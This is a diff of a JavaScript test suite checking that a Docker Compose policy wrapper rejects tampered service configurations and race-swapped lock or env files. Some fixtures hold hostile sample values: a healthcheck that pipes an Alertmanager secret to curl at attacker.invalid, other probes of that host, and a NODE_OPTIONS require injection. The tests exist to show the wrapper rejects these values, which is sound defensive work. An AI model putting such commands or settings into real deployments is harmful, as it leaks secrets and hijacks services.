+      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
+      const result = runWrapper(sandbox, ["config", "--format", "json"]);
+      assert.equal(renderer.count(), 1, `${label} caused a second render`);
+      assert.notEqual(result.status, 0, `${label} was accepted`);
+      assert.equal(result.stdout, "");
+      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
+      assert.match(result.stderr, /semantic authority|runtime isolation/i);
+    }
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted pins exact container lifecycle and dependency identity", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(baseline.status, 0, baseline.stderr);
+    assert.equal(renderer.count(), 1);
+
+    const mutations = [
+      ["container collision", (config) => {
+        config.services.alertmanager.container_name =
+          config.services.postgres.container_name;
+      }],
+      ["required pid omitted", (config) => {
+        delete config.services["node-exporter"].pid;
+      }],
+      ["required network mode omitted", (config) => {
+        delete config.services["local-registry"].network_mode;
+      }],
+      ["restart drift", (config) => {
+        config.services.alertmanager.restart = "unless-stopped";
+      }],
+      ["profile drift", (config) => {
+        config.services["backup-scheduler"].profiles = [];
+      }],
+      ["WAF dependency omitted", (config) => {
+        delete config.services.waf.depends_on;
+      }],
+      ["WAF dependency widened", (config) => {
+        config.services.waf.depends_on.postgres = {
+          condition: "service_healthy",
+          required: true,
+          restart: false,
+        };
+      }],
+    ];
+    for (const [label, mutate] of mutations) {
+      const config = coreAuthorityConfig();
+      mutate(config);
+      renderer.reset();
+      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
+      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
+      assert.equal(renderer.count(), 1, `${label} caused a second render`);
+      assert.notEqual(rejected.status, 0, `${label} was accepted`);
+      assert.equal(rejected.stdout, "");
+      assert.match(rejected.stderr, /semantic authority/i);
+    }
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted pins every non-NONE healthcheck to its exact static definition", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(baseline.status, 0, baseline.stderr);
+    assert.equal(renderer.count(), 1);
+
+    for (const [serviceName, hostileTest] of [
+      ["alertmanager", ["CMD-SHELL", "cat /run/secrets/alertmanager_webhook_token | curl -d @- https://attacker.invalid"]],
+      ["keycloak", ["CMD-SHELL", "curl -fsS http://attacker.invalid/ready"]],
+      ["postgres", ["CMD-SHELL", "pg_isready -h attacker.invalid"]],
+    ]) {
+      const config = coreAuthorityConfig();
+      config.services[serviceName].healthcheck.test = hostileTest;
+      renderer.reset();
+      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
+      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
+      assert.equal(renderer.count(), 1, `${serviceName} caused a second render`);
+      assert.notEqual(rejected.status, 0, `${serviceName} hostile healthcheck was accepted`);
+      assert.equal(rejected.stdout, "");
+      assert.match(rejected.stderr, /semantic authority/i);
+    }
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted pins logging presence and absence per core service", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(baseline.status, 0, baseline.stderr);
+    assert.equal(renderer.count(), 1);
+
+    const missingRequired = coreAuthorityConfig();
+    delete missingRequired.services.alertmanager.logging;
+    renderer.reset();
+    writeDockerOutput(sandbox, `${JSON.stringify(missingRequired)}\n`);
+    const missingRejected = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(renderer.count(), 1);
+    assert.notEqual(missingRejected.status, 0, "required alertmanager logging was optional");
+    assert.equal(missingRejected.stdout, "");
+    assert.match(missingRejected.stderr, /semantic authority/i);
+
+    const unexpected = coreAuthorityConfig();
+    unexpected.services["docker-socket-proxy"].logging = {
+      driver: "json-file",
+      options: { "max-size": "10m", "max-file": "5" },
+    };
+    renderer.reset();
+    writeDockerOutput(sandbox, `${JSON.stringify(unexpected)}\n`);
+    const unexpectedRejected = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(renderer.count(), 1);
+    assert.notEqual(unexpectedRejected.status, 0, "proxy accepted undeclared logging");
+    assert.equal(unexpectedRejected.stdout, "");
+    assert.match(unexpectedRejected.stderr, /semantic authority/i);
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted rejects security-sensitive core environment divergence", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(baseline.status, 0, baseline.stderr);
+    assert.equal(renderer.count(), 1);
+
+    const mutations = [
+      ["WAF ModSecurity disabled", (config) => {
+        config.services.waf.environment.MODSEC_RULE_ENGINE = "Off";
+      }],
+      ["WAF anomaly threshold widened", (config) => {
+        config.services.waf.environment.ANOMALY_INBOUND = "999999";
+      }],
+      ["control-center issuer redirected", (config) => {
+        config.services["control-center"].environment.CONTROL_CENTER_OIDC_ISSUER =
+          "https://attacker.invalid/realms/platform";
+      }],
+      ["backup retention apply mismatch", (config) => {
+        config.services["backup-scheduler"].environment
+          .BACKUP_SCHEDULER_ENABLE_RETENTION_APPLY = "true";
+      }],
+      ["Node option injection", (config) => {
+        config.services["control-center"].environment.NODE_OPTIONS =
+          "--require=/tmp/attacker.cjs";
+      }],
+    ];
+    for (const [label, mutate] of mutations) {
+      const config = coreAuthorityConfig();
+      mutate(config);
+      renderer.reset();
+      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
+      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
+      assert.equal(renderer.count(), 1, `${label} caused a second render`);
+      assert.notEqual(rejected.status, 0, `${label} was accepted`);
+      assert.equal(rejected.stdout, "");
+      assert.match(rejected.stderr, /semantic authority/i);
+    }
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted semantic projection follows the exact trusted env snapshot", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    const environmentBytes = [
+      "HOSTED_WORKLOAD_LOCK=",
+      "HOSTED_WORKLOAD_MODE=no-hosted",
+      "DOMAIN=parity.invalid",
+      "ALERTMANAGER_SECRET_GID=2222",
+      "ALERTMANAGER_IMAGE=trusted.invalid/alertmanager@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "LOCAL_DNS_BIND=127.0.0.53",
+      "WAF_HTTP_BIND=127.0.0.2:8088",
+      "WAF_HTTPS_BIND=127.0.0.2:8448",
+      "WAF_NGINX_ALWAYS_TLS_REDIRECT=off",
+      "WAF_BLOCKING_PARANOIA=2",
+      "WAF_DETECTION_PARANOIA=3",
+      "WAF_ANOMALY_INBOUND=8",
+      "WAF_ANOMALY_OUTBOUND=7",
+      "DOCKER_SOCKET_PROXY_PORT=3376",
+      "PLATFORM_NETWORK_PREFIX=parity_core",
+      "MARIADB_DATA_VOLUME=enterprise_parity_mariadb",
+      "BACKUP_SCHEDULER_LOG_VOLUME=platform_parity_backup_logs",
+      "PROMETHEUS_RETENTION_TIME=30d",
+      "CONTROL_CENTER_OIDC_ISSUER=https://issuer.parity.invalid/realms/platform",
+      "CONTROL_CENTER_DATABASE_URL_SECRET_FILE=secrets/parity-control-url.txt",
+      "BACKUP_SCHEDULER_ENABLE_RETENTION_APPLY=true",
+      "BACKUP_SCHEDULER_ENABLE_OFFSITE=false",
+      "",
+    ].join("\n");
+    fs.writeFileSync(sandbox.environmentFile, environmentBytes, { mode: 0o600 });
+    const config = coreAuthorityConfig();
+    config.services.alertmanager.group_add = ["2222"];
+    config.services.alertmanager.image =
+      "trusted.invalid/alertmanager@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+    config.services["local-dns"].ports = [
+      { host_ip: "127.0.0.53", protocol: "tcp", published: "53", target: 53 },
+      { host_ip: "127.0.0.53", protocol: "udp", published: "53", target: 53 },
+    ];
+    config.services.waf.ports = [
+      { host_ip: "127.0.0.2", protocol: "tcp", published: "8088", target: 8080 },
+      { host_ip: "127.0.0.2", protocol: "tcp", published: "8448", target: 8443 },
+    ];
+    Object.assign(config.services.waf.environment, {
+      NGINX_ALWAYS_TLS_REDIRECT: "off",
+      BLOCKING_PARANOIA: "2",
+      DETECTION_PARANOIA: "3",
+      ANOMALY_INBOUND: "8",
+      ANOMALY_OUTBOUND: "7",
+    });
+    config.services["control-center"].environment.CONTROL_CENTER_OIDC_ISSUER =
+      "https://issuer.parity.invalid/realms/platform";
+    config.services["backup-scheduler"].environment
+      .BACKUP_SCHEDULER_ENABLE_RETENTION_APPLY = "true";
+    config.services["docker-socket-proxy"].ports[0].published = "3376";
+    config.services.prometheus.command[2] = "--storage.tsdb.retention.time=30d";
+    for (const networkName of expectedCoreInventory.networks) {
+      if (networkName.startsWith("platform_") && networkName !== "platform_docker_control") {
+        config.networks[networkName].name = `parity_core_${networkName.slice("platform_".length)}`;
+      }
+    }
+    config.volumes.enterprise_mariadb_data.name = "enterprise_parity_mariadb";
+    config.volumes.backup_scheduler_logs.name = "platform_parity_backup_logs";
+    config.secrets.control_center_database_url.file =
+      path.join(sandbox.root, "secrets/parity-control-url.txt");
+    config.configs.enterprise_traefik_routes.content =
+      config.configs.enterprise_traefik_routes.content.replaceAll("fixture.invalid", "parity.invalid");
+
+    const expectedBytes = `${JSON.stringify(config, null, 2)}\n`;
+    writeDockerOutput(sandbox, expectedBytes);
+    const accepted = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(accepted.status, 0, accepted.stderr);
+    assert.equal(renderer.count(), 1);
+    assert.equal(accepted.stdout, expectedBytes);
+    assert.doesNotMatch(accepted.stderr, /MODULE_NOT_FOUND/);
+
+    renderer.reset();
+    const mismatched = structuredClone(config);
+    mismatched.services.alertmanager.image =
+      `attacker.invalid/alertmanager@sha256:${"f".repeat(64)}`;
+    writeDockerOutput(sandbox, `${JSON.stringify(mismatched)}\n`);
+    const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(renderer.count(), 1);
+    assert.notEqual(rejected.status, 0);
+    assert.equal(rejected.stdout, "");
+    assert.match(rejected.stderr, /semantic authority|runtime isolation/i);
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted exact Engine authority rejects grants ports topology and redirects", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const renderer = installCountingRenderer(sandbox);
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.equal(baseline.status, 0, baseline.stderr);
+    assert.equal(renderer.count(), 1);
+    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
+    const mutations = [
+      ["port", (config) => {
+        config.services.alertmanager.ports.push({
+          host_ip: "0.0.0.0", published: "9093", target: 9093, protocol: "tcp",
+        });
+      }],
+      ["network grant", (config) => {
+        config.services.alertmanager.networks.platform_db_admin = null;
+      }],
+      ["secret grant", (config) => {
+        config.services.alertmanager.secrets.push("postgres_superuser_password");
+      }],
+      ["config grant", (config) => {
+        config.services.alertmanager.configs.push({
+          source: "enterprise_traefik_routes",
+          target: "/tmp/routes.yml",
+        });
+      }],
+      ["repository bind source", (config) => {
+        config.services.alertmanager.volumes = [{
+          type: "bind",
+          source: path.join(sandbox.root, "README.md"),
+          target: "/etc/alertmanager/alertmanager.yml",
+          read_only: true,
+        }];
+      }],
+      ["volume physical redirect", (config) => {
+        config.volumes.enterprise_postgres_data.name = "attacker_volume";
+      }],
+      ["volume external reuse", (config) => {
+        config.volumes.enterprise_postgres_data.external = true;
+      }],
+      ["network physical redirect", (config) => {
+        config.networks.platform_cache.name = "attacker_network";
+      }],
+      ["network internal widening", (config) => {
+        config.networks.platform_cache.internal = false;
+      }],
+      ["network attachable widening", (config) => {
+        config.networks.platform_cache.attachable = true;
+      }],
+      ["config content redirect", (config) => {
+        config.configs.enterprise_traefik_routes.content =
+          config.configs.enterprise_traefik_routes.content.replace(
+            "http://control-center:8080",
+            "http://attacker:8080",
+          );
+      }],
+      ["secret repository redirect", (config) => {
+        config.secrets.smtp_password.file = path.join(
+          sandbox.root,
+          coreSemanticPolicyDescriptor.secretFiles.redis_password,
+        );
+      }],
+    ];
+    for (const [label, mutate] of mutations) {
+      const config = coreAuthorityConfig();
+      mutate(config);
+      for (const kind of protectedKinds) {
+        assert.deepEqual(Object.keys(config[kind]).sort(), expectedCoreInventory[kind]);
+      }
+      renderer.reset();
+      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
+      const result = runWrapper(sandbox, ["config", "--format", "json"]);
+      assert.equal(renderer.count(), 1, `${label} caused a second render`);
+      assert.notEqual(result.status, 0, `${label} was accepted`);
+      assert.equal(result.stdout, "");
+      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
+      assert.match(result.stderr, /semantic authority|runtime isolation/i);
+    }
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 no-hosted semantic descriptor mismatch fails closed before renderer", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const tamperedLock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
+    tamperedLock.coreSemanticPolicy.sha256 = "f".repeat(64);
+    fs.writeFileSync(sandbox.canonicalLock, `${JSON.stringify(tamperedLock, null, 2)}\n`, { mode: 0o600 });
+    const configPath = path.join(sandbox.root, "core-config.json");
+    fs.writeFileSync(configPath, `${JSON.stringify(coreAuthorityConfig())}\n`, { mode: 0o600 });
+    const direct = spawnSync(process.execPath, [
+      path.join(sandbox.scripts, "no-hosted-core-policy.mjs"),
+      "--root",
+      sandbox.root,
+      "--lock",
+      sandbox.canonicalLock,
+      "--config",
+      configPath,
+      "--env",
+      sandbox.environmentFile,
+    ], { encoding: "utf8" });
+    assert.notEqual(direct.status, 0, "helper accepted a mismatched policy descriptor");
+    assert.equal(direct.stdout, "");
+    assert.match(direct.stderr, /semantic authority rejected: policy-binding/i);
+    assert.equal(fs.existsSync(sandbox.dockerMarker), false);
+
+    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
+    const wrapper = runWrapper(sandbox, ["config", "--format", "json"]);
+    assert.notEqual(wrapper.status, 0, "wrapper accepted a mismatched policy descriptor");
+    assert.equal(wrapper.stdout, "");
+    assert.equal(fs.existsSync(sandbox.dockerMarker), false, "descriptor mismatch invoked renderer");
+    assert.match(wrapper.stderr, /no-hosted lock raw digest mismatch|runtime lock is invalid/i);
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
 test("QA6 canonical no-hosted lock contains the exact authoritative core inventory", () => {
   const lock = JSON.parse(fs.readFileSync(canonicalNoHostedLockPath, "utf8"));
   assert.deepEqual(Object.keys(lock).sort(), [
     "brokerPolicySha256",
+    "coreSemanticPolicy",
     "projectName",
     "protectedResourceNames",
     "routes",
@@ -918,6 +1711,10 @@ test("QA6 canonical no-hosted lock contains the exact authoritative core invento
     "version",
     "workloads",
   ]);
+  assert.deepEqual(lock.coreSemanticPolicy, {
+    schema: "platform-no-hosted-core-capability-policy/v1",
+    sha256: "6931457ee76eff59ba6788d47f4ad6cac2da4bb171a94d51ffc3b3239bb71151",
+  });
   assert.equal(lock.projectName, "platform_infra_vps");
   assert.deepEqual(Object.keys(lock.protectedResourceNames).sort(), protectedKinds);
   assert.deepEqual(lock.protectedResourceNames, expectedCoreInventory);
@@ -1088,13 +1885,15 @@ test("QA6 no-hosted lock race preserves the initial authoritative snapshot or fa
     assert.notEqual(preTampered.status, 0, "pre-tampered canonical lock reached Docker");
     fs.writeFileSync(sandbox.canonicalLock, originalLockBytes, { mode: 0o600 });
 
-    const replacement = path.join(sandbox.root, "replacement.lock.json");
+    const replacement = path.join(sandbox.root, "swap-lock-replacement");
     const replacementBytes = Buffer.from('{"attacker":true}\n');
     fs.writeFileSync(replacement, replacementBytes, { mode: 0o600 });
-    const raced = runWrapper(sandbox, undefined, {
-      QA6_SWAP_LOCK_REPLACEMENT: replacement,
-      QA6_SWAP_LOCK_TARGET: sandbox.canonicalLock,
-    });
+    const raced = runWrapper(sandbox);
+    assert.equal(
+      fs.existsSync(path.join(sandbox.root, "lock-swap-fired")),
+      true,
+      "lock race fake renderer did not execute the swap",
+    );
     if (raced.status !== 0) {
       assert.match(
         raced.stderr,
@@ -1116,12 +1915,12 @@ test("QA6 no-hosted lock race preserves the initial authoritative snapshot or fa
 test("QA6 no-hosted env bytes are stable from mode parse through Compose render", () => {
   const sandbox = createConsumerSandbox();
   try {
-    const initialEnvironment = "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nCORE_VALUE=trusted\n";
+    const initialEnvironment = "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nCORE_VALUE=trusted\nDOMAIN=fixture.invalid\n";
     fs.writeFileSync(sandbox.environmentFile, initialEnvironment, { mode: 0o600 });
-    const hostileEnvironment = path.join(sandbox.root, "hostile.env");
+    const hostileEnvironment = path.join(sandbox.root, "swap-env-replacement");
     fs.writeFileSync(
       hostileEnvironment,
-      "HOSTED_WORKLOAD_LOCK=/attacker.lock\nHOSTED_WORKLOAD_MODE=hosted\nCORE_VALUE=hostile\n",
+      "HOSTED_WORKLOAD_LOCK=/attacker.lock\nHOSTED_WORKLOAD_MODE=hosted\nCORE_VALUE=hostile\nDOMAIN=attacker.invalid\n",
       { mode: 0o600 },
     );
     writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(sandbox.inventory))}\n`);
@@ -1131,10 +1930,13 @@ test("QA6 no-hosted env bytes are stable from mode parse through Compose render"
 
     fs.rmSync(sandbox.dockerMarker, { force: true });
     fs.rmSync(sandbox.dockerEnvironmentCapture, { force: true });
-    const raced = runWrapper(sandbox, undefined, {
-      QA6_SWAP_ENV_REPLACEMENT: hostileEnvironment,
-      QA6_SWAP_ENV_TARGET: sandbox.environmentFile,
-    });
+    fs.writeFileSync(path.join(sandbox.root, "swap-env-trigger"), "swap\n", { mode: 0o600 });
+    const raced = runWrapper(sandbox);
+    assert.equal(
+      fs.existsSync(path.join(sandbox.root, "env-swap-fired")),
+      true,
+      "env race fake renderer did not execute the swap",
+    );
     const consumedBytes = fs.existsSync(sandbox.dockerEnvironmentCapture)
       ? fs.readFileSync(sandbox.dockerEnvironmentCapture, "utf8")
       : "";
@@ -1146,6 +1948,48 @@ test("QA6 no-hosted env bytes are stable from mode parse through Compose render"
       );
     } else {
       assert.equal(consumedBytes, initialEnvironment, `Compose consumed swapped env bytes:\n${consumedBytes}`);
+    }
+  } finally {
+    removeSandbox(sandbox);
+  }
+});
+
+test("QA7 Compose renderer receives only the minimal authoritative process environment", () => {
+  const sandbox = createConsumerSandbox();
+  try {
+    const config = coreAuthorityConfig();
+    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
+    const rendered = runWrapper(
+      sandbox,
+      ["config", "--format", "json"],
+      {
+        KC_HOSTNAME_STRICT: "false",
+        POSTGRES_IMAGE: `attacker.invalid/postgres@sha256:${"f".repeat(64)}`,
+      },
+    );
+    assert.equal(rendered.status, 0, rendered.stderr);
+    assert.deepEqual(JSON.parse(rendered.stdout), config);
+    const rendererEnvironment =
+      fs.readFileSync(sandbox.dockerProcessEnvironmentCapture, "utf8");
+    assert.doesNotMatch(rendererEnvironment, /^KC_HOSTNAME_STRICT=/m);
+    assert.doesNotMatch(rendererEnvironment, /^POSTGRES_IMAGE=/m);
+    assert.match(rendererEnvironment, /^DOCKER_HOST=unix:\/\/\/var\/run\/docker\.sock$/m);
+    assert.match(
+      rendererEnvironment,
+      new RegExp(
+        `^HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE=${sandbox.canonicalLock.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`,
+        "m",
+      ),
+    );
+    assert.match(
+      rendererEnvironment,
+      new RegExp(`^PATH=${sandbox.environment.PATH.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "m"),
+    );
+    if (process.env.HOME) {
+      assert.match(
+        rendererEnvironment,
+        new RegExp(`^HOME=${process.env.HOME.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "m"),
+      );
     }
   } finally {
     removeSandbox(sandbox);
